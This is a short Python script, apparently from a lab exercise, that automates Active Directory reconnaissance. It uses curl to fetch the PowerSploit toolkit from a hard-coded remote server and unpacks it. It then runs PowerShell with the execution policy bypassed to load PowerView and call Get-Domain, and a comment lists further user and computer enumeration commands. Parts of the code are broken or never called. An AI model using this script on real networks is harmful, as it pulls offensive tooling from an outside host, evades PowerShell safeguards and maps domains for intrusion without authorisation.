import subprocess
import ipaddress
import os


#I want to get powerview from server first

# server_ip_adress = input("Please enter servers IP adress:")
server_ip_adress = '10.0.2.4'
# print(ipaddress.ip_address(server_ip_adress))

class ip_address():
    def __init__(self):
        # self.address = input("Please enter servers IP adress:")
        self.address = "10.0.2.10"
        self.valid_address = ipaddress.ip_address(self.address)
        # self.port = int(input("Please input the port of the server:"))
        self.port = 8000

        
class curl_data():
    def __init__(self):
        self.command = "curl"
        self.url = input("Please enter the url of file.\nPress Enter if file is in default directory.")
        # self.url = ""

    def down_data(self,server):
        if self.url == "": #Use default URL
            self.command = f'{self.command} -o PowerSploit.zip http://{server.address}:{server.port}/PowerSploit-master_3.zip'
            self.output = subprocess.run(self.command,shell=True)
            
    def extract_data(self):
        self.extract_cmd = f'tar -xvf ./PowerSploit.zip '
        self.output = subprocess.run(self.extract_cmd,shell=True)
        # tar -xvf ./PowerSploit.zip



class enumerate():
    def __init__(self):
        self.enum_name = "{self}_PowerSploit.txt"
        self.powersploit = "PowerSploit-master"
    
    def change_dir(self):
        os.chdir(self.powersploit)
        self.command = f'PowerSploit.psm1'
        #self.print_dir = subprocess.run(self.command,shell=True)
    
    def psm_ps(self):
        self.ps1 = open('PowerSploit.ps1','a')
        self.psm1 = open('PowerSploit.psm1','r')
        self.psm1.data = self.psm1.read()
        self.ps1.write(self.psm1.data)
        self.psm1.close()
        self.ps1.close()

    def ps1_exec(self):
            print(os.listdir())
            #os.chdir('PowerSploit-master')
            self.powershell_cmd = r'''powershell -ep bypass ; . .\PowerSploit.ps1; Get-Domain'''
            #;Get-DomainController;Get-Forest;Get-ForestDomain;Get-DomainUser;Get-DomainComputer;
            self.powershell = subprocess.run(self.powershell_cmd,shell=True)
    


server = ip_address()
link = curl_data()
enum = enumerate()
enum.change_dir()
enum.psm_ps()
enum.ps1_exec()

